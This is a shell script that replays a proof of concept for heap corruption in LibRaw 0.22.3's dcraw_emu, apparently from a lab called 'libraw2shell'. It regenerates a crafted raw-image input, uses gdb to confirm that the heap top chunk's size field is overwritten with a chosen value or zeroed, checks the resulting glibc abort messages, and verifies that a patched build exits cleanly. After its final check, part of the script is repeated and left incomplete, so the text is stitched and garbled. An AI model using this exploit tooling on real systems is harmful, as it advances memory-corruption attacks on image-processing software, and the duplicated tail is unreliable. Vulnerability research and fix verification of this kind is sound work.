#!/bin/sh
# One-command clean replay of W21. Run from any cwd:
#   sh lab/frontier/libraw2shell/w21/replay.sh
# Source/probe/input hashes are checked on every run. w21/hashes.sha256
# additionally pins the author-local -g binaries; clean rebuilds embed a
# different build path and are checked by behavior below instead.
set -u
ORIG=$(pwd)
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$HERE/.." || exit 2
pass=0
fail=0
ok() {
  label=$1
  shift
  if "$@"; then printf 'PASS %s\n' "$label"; pass=$((pass+1))
  else printf 'FAIL %s\n' "$label"; fail=$((fail+1)); fi
}
has() { grep -q "$1" "$2"; }
run_rc() { # rc, stderr file, expected stderr substring, env, binary, input
  erc=$1; errf=$2; msg=$3; pad=$4; bin=$5; input=$6
  env MALLOC_TOP_PAD_="$pad" "$bin" -n 1 "$input" > /dev/null 2> "$errf"
  rc=$?
  [ "$rc" = "$erc" ] && has "$msg" "$errf"
}

ok 'hashes of pins, generator, inputs and probes' \
  sh -c 'sha256sum -c w21/hashes-clean.sha256 >w21/replay-hashes.out 2>&1'
ok 'zero input regenerates byte-exact from spec' \
  sh -c 'python3 craft_uncompressed_poc.py w11/targetbeef.input w21/regen-zero.input w21/zero.json >/dev/null && cmp -s w21/regen-zero.input w21/zero.input'

cd w21 || exit 2
ok 'dead-target: chosen top size field after store loop' \
  sh -c 'gdb -q -batch -x sizefield-dead.gdb ../o0/LibRaw-0.22.3/bin/dcraw_emu >replay-dead-gdb.txt 2>&1; grep -q "W21 AFTER sf=0xbedbbeef4d03" replay-dead-gdb.txt && grep -q "free(): invalid next size (normal)" replay-dead-gdb.txt'
ok 'zero: zeroed top size field after store loop' \
  sh -c 'gdb -q -batch -x sizefield-zero.gdb ../o0/LibRaw-0.22.3/bin/dcraw_emu >replay-zero-gdb.txt 2>&1; grep -q "W21 AFTER sf=0 hw=0000 0000 0000 0000" replay-zero-gdb.txt && grep -q "corrupted size vs. prev_size" replay-zero-gdb.txt'
cd "$HERE/.." || exit 2

ok 'plain dead-target pad16 rc134 invalid-next-size' \
  run_rc 134 w21/replay-dead.err 'free(): invalid next size (normal)' 16777216 \
    plain/LibRaw-0.22.3/bin/dcraw_emu w13/dead-target.input
ok 'plain dead-target pad64 rc134 invalid-next-size' \
  run_rc 134 w21/replay-dead64.err 'free(): invalid next size (normal)' 67108864 \
    plain/LibRaw-0.22.3/bin/dcraw_emu w13/dead-target.input
ok 'plain zero pad16 rc134 corrupted-size-vs-prev-size' \
  run_rc 134 w21/replay-zero.err 'corrupted size vs. prev_size' 16777216 \
    plain/LibRaw-0.22.3/bin/dcraw_emu w21/zero.input
ok 'fixed dead-target pad16 rc0' \
  sh -c 'env MALLOC_TOP_PAD_=16777216 fixed/LibRaw-0.22.3/bin/dcraw_emu -n 1 w13/dead-target.input >/dev/null 2>w21/replay-fixed-dead.err; [ $? = 0 ] && [ ! -s w21/replay-fixed-dead.err ]'
ok 'fixed zero pad16 rc0' \
  sh -c 'env MALLOC_TOP_PAD_=16777216 fixed/LibRaw-0.22.3/bin/dcraw_emu -n 1 w21/zero.input >/dev/null 2>w21/replay-fixed-zero.err; [ $? = 0 ] && [ ! -s w21/replay-fixed-zero.err ]'
ok 'no-option dead-target pad16 rc0' \
  sh -c 'env MALLOC_TOP_PAD_=16777216 plain/LibRaw-0.22.3/bin/dcraw_emu w13/dead-target.input >/dev/null 2>w21/replay-nodead.err; [ $? = 0 ] && [ ! -s w21/replay-nodead.err ]'
ok 'no-option zero pad16 rc0' \
  sh -c 'env MALLOC_TOP_PAD_=16777216 plain/LibRaw-0.22.3/bin/dcraw_emu w21/zero.input >/dev/null 2>w21/replay-nozero.err; [ $? = 0 ] && [ ! -s w21/replay-nozero.err ]'

printf 'PASS=%s FAIL=%s\n' "$pass" "$fail"
[ "$fail" = 0 ] && printf 'W21_OK\n'
cd "$ORIG" || exit 2
[ "$fail" = 0 ]
cd "$HERE/.." || exit 2
pass=0
fail=0
ok() {
  label=$1
  shift
  if "$@"; then printf 'PASS %s\n' "$label"; pass=$((pass+1))
  else printf 'FAIL %s\n' "$label"; fail=$((fail+1)); fi
}
has() { grep -q "$1" "$2"; }
run_rc() { # rc, stderr file, expected stderr substring, env, binary, input
  erc=$1; errf=$2; msg=$3; pad=$4; bin=$5; input=$6
  env MALLOC_TOP_PAD_="$pad" "$bin" -n 1 "$input" > /dev/null 2> "$errf"
  rc=$?
  [ "$rc" = "$erc" ] && has "$msg" "$errf"
}
